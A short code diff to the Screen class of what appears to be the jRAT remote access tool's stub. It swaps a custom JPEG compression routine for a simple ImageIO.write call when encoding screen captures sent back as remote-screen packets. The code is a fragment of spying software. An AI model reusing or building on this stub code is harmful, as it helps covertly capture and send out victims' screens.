@@ -11,13 +11,8 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
-import java.util.Iterator;
 
-import javax.imageio.IIOImage;
 import javax.imageio.ImageIO;
-import javax.imageio.ImageWriteParam;
-import javax.imageio.ImageWriter;
-import javax.imageio.stream.ImageOutputStream;
 
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet17RemoteScreen;
@@ -128,7 +123,7 @@ public class Screen implements Runnable {
 					
 					ByteArrayOutputStream bss = new ByteArrayOutputStream();
 					
-					  ImageOutputStream baos =
+					 /* ImageOutputStream baos =
 					  ImageIO.createImageOutputStream(bss);
 					  Iterator<ImageWriter> iter =
 					  ImageIO.getImageWritersByFormatName("jpeg"); ImageWriter
@@ -136,9 +131,9 @@ public class Screen implements Runnable {
 					  writer.getDefaultWriteParam(); iwp.setCompressionMode(2);
 					  iwp.setCompressionQuality(quality / 10F);
 					  writer.setOutput(baos); writer.write(null, new
-					 IIOImage(i, null, null), iwp); writer.dispose();
+					 IIOImage(i, null, null), iwp); writer.dispose();*/
 					 
-					//ImageIO.write(i, "png", bss);
+					ImageIO.write(i, "jpg", bss);
 					byte[] buffer = bss.toByteArray();
 
 					prevSums[is++] = i;
